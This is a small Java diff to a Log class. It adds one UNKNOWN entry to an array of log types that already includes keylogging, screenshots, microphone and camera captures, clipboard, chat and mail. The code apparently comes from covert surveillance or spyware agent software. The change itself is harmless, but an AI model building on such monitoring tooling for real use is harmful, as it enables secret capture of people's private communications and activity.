@@ -77,7 +77,8 @@ public final class Log {
             LogType.CALL_MOBILE, // 4..7
             LogType.KEYLOG, LogType.SNAPSHOT, LogType.URL, LogType.CHAT, // 8..b
             LogType.MAIL, LogType.MIC, LogType.CAMSHOT, LogType.CLIPBOARD, // c..f
-            LogType.UNKNOWN, LogType.APPLICATION // 10..11
+            LogType.UNKNOWN, LogType.APPLICATION, // 10..11
+            LogType.UNKNOWN  // 12
     };
 
     private static final long MIN_AVAILABLE_SIZE = 200 * 1024;
